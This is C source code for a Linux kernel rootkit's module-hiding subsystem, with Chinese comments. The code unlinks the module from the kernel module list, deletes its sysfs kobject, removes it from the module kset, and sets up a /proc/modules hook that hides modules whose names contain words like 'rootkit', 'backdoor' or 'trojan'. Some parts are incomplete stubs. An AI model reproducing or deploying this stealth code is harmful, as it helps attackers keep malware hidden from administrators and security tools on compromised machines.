/*
 * Module Hiding Implementation
 * Advanced techniques for hiding kernel modules from detection
 */

#include "rootkit.h"

// 外部变量声明
extern struct list_head *module_previous;
extern short module_hidden;
extern struct module *THIS_MODULE;

// 原始函数指针
static int (*original_proc_modules_show)(struct seq_file *m, void *v);
static struct file_operations *original_proc_modules_fops;

// 模块隐藏相关函数
static int is_hidden_module(const char *name);
static int hooked_proc_modules_show(struct seq_file *m, void *v);
static void hide_from_proc_modules(void);
static void restore_proc_modules(void);
static void hide_from_sysfs(void);
static void restore_sysfs(void);
static void hide_from_kset(void);
static void restore_kset(void);

// 检查是否为需要隐藏的模块
static int is_hidden_module(const char *name) {
    // 隐藏rootkit模块
    if (strstr(name, "rootkit") != NULL) {
        return 1;
    }
    
    // 隐藏其他可疑模块名
    const char *suspicious_names[] = {
        "rk_", "hide", "stealth", "backdoor", "trojan",
        "malware", "virus", "exploit", NULL
    };
    
    int i;
    for (i = 0; suspicious_names[i] != NULL; i++) {
        if (strstr(name, suspicious_names[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

// Hook /proc/modules 显示函数
static int hooked_proc_modules_show(struct seq_file *m, void *v) {
    struct module *mod = list_entry(v, struct module, list);
    
    // 如果是隐藏的模块，跳过显示
    if (is_hidden_module(mod->name)) {
        return 0;
    }
    
    // 调用原始显示函数
    return original_proc_modules_show(m, v);
}

// 从 /proc/modules 中隐藏
static void hide_from_proc_modules(void) {
    struct proc_dir_entry *proc_modules;
    
    // 查找 /proc/modules 条目
    proc_modules = proc_find_entry("modules", NULL);
    if (!proc_modules) {
        printk(KERN_WARNING "[rootkit] Cannot find /proc/modules entry\n");
        return;
    }
    
    // 保存原始文件操作结构
    original_proc_modules_fops = (struct file_operations *)proc_modules->proc_fops;
    
    // 这里需要更复杂的实现来hook /proc/modules
    // 由于内核版本差异，这部分需要根据具体内核调整
    
    printk(KERN_INFO "[rootkit] Hooked /proc/modules\n");
}

// 恢复 /proc/modules
static void restore_proc_modules(void) {
    struct proc_dir_entry *proc_modules;
    
    if (!original_proc_modules_fops) {
        return;
    }
    
    proc_modules = proc_find_entry("modules", NULL);
    if (proc_modules) {
        proc_modules->proc_fops = original_proc_modules_fops;
        printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
    }
}

// 从 sysfs 中隐藏
static void hide_from_sysfs(void) {
    // 隐藏 /sys/module/rootkit 目录
    if (THIS_MODULE->mkobj.kobj.parent) {
        kobject_del(&THIS_MODULE->mkobj.kobj);
        printk(KERN_INFO "[rootkit] Hidden from sysfs\n");
    }
}

// 恢复 sysfs 显示
static void restore_sysfs(void) {
    // 这个操作比较复杂，通常不可逆
    // 在实际实现中需要保存更多状态信息
    printk(KERN_INFO "[rootkit] Sysfs restore attempted\n");
}

// 从内核模块链表中隐藏
static void hide_from_kset(void) {
    // 从模块kset中移除
    if (THIS_MODULE->mkobj.kobj.kset) {
        spin_lock(&THIS_MODULE->mkobj.kobj.kset->list_lock);
        list_del_init(&THIS_MODULE->mkobj.kobj.entry);
        spin_unlock(&THIS_MODULE->mkobj.kobj.kset->list_lock);
        printk(KERN_INFO "[rootkit] Hidden from module kset\n");
    }
}

// 恢复到内核模块链表
static void restore_kset(void) {
    if (THIS_MODULE->mkobj.kobj.kset) {
        spin_lock(&THIS_MODULE->mkobj.kobj.kset->list_lock);
        list_add_tail(&THIS_MODULE->mkobj.kobj.entry, 
                     &THIS_MODULE->mkobj.kobj.kset->list);
        spin_unlock(&THIS_MODULE->mkobj.kobj.kset->list_lock);
        printk(KERN_INFO "[rootkit] Restored to module kset\n");
    }
}

// 高级模块隐藏 - 组合多种技术
void advanced_hide_module(void) {
    if (module_hidden) {
        return;
    }
    
    // 1. 从模块链表中移除
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    
    // 2. 从 sysfs 中隐藏
    hide_from_sysfs();
    
    // 3. 从模块kset中隐藏
    hide_from_kset();
    
    // 4. Hook /proc/modules (需要更复杂的实现)
    hide_from_proc_modules();
    
    module_hidden = 1;
    printk(KERN_INFO "[rootkit] Advanced module hiding activated\n");
}

// 高级模块显示 - 恢复所有隐藏
void advanced_show_module(void) {
    if (!module_hidden) {
        return;
    }
    
    // 1. 恢复到模块链表
    list_add(&THIS_MODULE->list, module_previous);
    
    // 2. 恢复 sysfs 显示
    restore_sysfs();
    
    // 3. 恢复模块kset
    restore_kset();
    
    // 4. 恢复 /proc/modules
    restore_proc_modules();
    
    module_hidden = 0;
    printk(KERN_INFO "[rootkit] Advanced module hiding deactivated\n");
}

// 检查模块是否被隐藏
int is_module_hidden(void) {
    return module_hidden;
}

// 获取模块隐藏状态信息
void get_hiding_status(char *buffer, size_t size) {
    snprintf(buffer, size, 
        "Module Hidden: %s\n"
        "List Hidden: %s\n"
        "Sysfs Hidden: %s\n"
        "Proc Hidden: %s\n",
        module_hidden ? "Yes" : "No",
        module_hidden ? "Yes" : "No",
        "Partial", // sysfs隐藏状态
        original_proc_modules_fops ? "Yes" : "No"
    );
}

// 模块隐藏初始化
int init_module_hiding(void) {
    printk(KERN_INFO "[rootkit] Module hiding subsystem initialized\n");
    return 0;
}

// 模块隐藏清理
void cleanup_module_hiding(void) {
    // 确保模块在卸载前是可见的
    if (module_hidden) {
        advanced_show_module();
    }
    
    printk(KERN_INFO "[rootkit] Module hiding subsystem cleaned up\n");
}

// 导出符号供主模块使用
// Functions are part of the same module, no need to export